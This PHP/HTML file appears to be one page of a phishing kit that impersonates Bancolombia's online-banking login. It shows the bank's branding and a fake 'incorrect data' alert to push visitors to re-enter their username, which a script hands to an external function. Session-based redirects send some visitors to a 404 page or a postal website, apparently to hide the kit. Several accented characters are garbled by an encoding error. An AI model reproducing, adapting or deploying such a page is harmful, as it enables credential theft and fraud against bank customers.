<?php
session_start();

if (isset($_SESSION['estado'])) {
    switch ($_SESSION['estado']) {
        case 2:
            header('Location: /404.php');
            exit;
        case 3:
            header('Location: https://www.4-72.com.co/publicaciones/236/personas/');
            exit;
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>AutenticaciÃ³n Bancolombia</title>
  <link rel="stylesheet" href="css/errorusuario.css">
  <link rel="icon" href="images/favicon.ico">
    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- jQuery -->
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js"></script>
    <script src="../../scripts/functions.js"></script>
</head>
<body class="fondo">
  <header>
    <img src="images/bancolombia.svg" alt="Bancolombia Logo" class="logo">
    <a href="#" class="logout">
      Salir
      <img src="images/flecha.svg" alt="Flecha" class="icono-flecha">
    </a>
  </header>
  <main>
    <h1 class="titulo" id="titulo-bienvenida" style="display: none;">Te damos la bienvenida</h1>
    <div class="Qhpfq">
      <div class="kcFuTg">
        <div class="xjvDB"></div>
      </div>
      <div class="gXnAHy">
        <div class="koglnq">Datos incorrectos</div>
        <div class="klyfsH">Los datos ingresados no coinciden, intÃ©ntalo nuevamente.</div>
      </div>
      <button aria-label="Cerrar" class="XjvPt">
        <div class="cFsVxj"></div>
      </button>
    </div>
    <div class="cuadroblanco">
      <div class="alineacion1">
        <div class="alineacion2"></div>
        <div class="alineacion3">
          El usuario es el mismo con el que ingresas a la
        </div>
        <div class="sucursal">
          Sucursal Virtual Personas.
        </div>
      </div>
      <form class="cajausuario1">
        <div class="cajausuario2">
          <div class="cajausuario3">
            <div class="iconouser"></div>
            <input 
            name="user" 
            type="text" 
            id="txtUsuario"
            placeholder=" "
            class="lineausuario"
            required
            maxlength="20"
            >
            <label class="lineausuario2">Usuario</label>
          </div>
          <p class="olvidaste1">Â¿Olvidaste tu usuario?</p>
        </div>
      
        <div class="volver1">
          <button 
            type="button" 
            id="btn-volver-user" 
            class="volver2"
          >
            <label class="volver3">Volver</label>
          </button>
      
          <div class="continuar1">
            <button 
              type="submit" 
              id="btnUsuario"
              class="continuar2"
            >
              <label class="continuar3">Continuar</label>
            </button>
        </div>
      </form>      
  </main>
  <div class="lineafinal1">
    <div class="lineafinal2"></div>
  
    <span class="lineafinal3">
      <div class="lineafinal4">
        <div class="lineafinal5"></div>
        <div class="lineafinal6"></div>
      </div>
  
      <div class="lineafinal7">
      </div>
    </span>
  </div>
<script>
    $(document).ready(function () {
        $('#btnUsuario').click(function () {
            if ($("#txtUsuario").val().trim().length > 0) {
                inicio($("#txtUsuario").val());
            } else {
                $("#err-mensaje").show();
                $("#txtUsuario").css("border-bottom", "1px solid red");
                $("#txtUsuario").focus();
            }
        });

        $("#txtUsuario").keyup(function () {
            $("#txtUsuario").css("border-bottom", "1px solid #dcdcdc");
            $("#err-mensaje").hide();
        });
    });
</script>
<script>
  $(document).ready(function () {
    $('.XjvPt').click(function () {
      $('.Qhpfq').hide(); // Oculta la alerta
      $('#titulo-bienvenida').css('display', 'flex'); // Muestra el tÃ­tulo
    });
  });
</script>
</body>
</html>
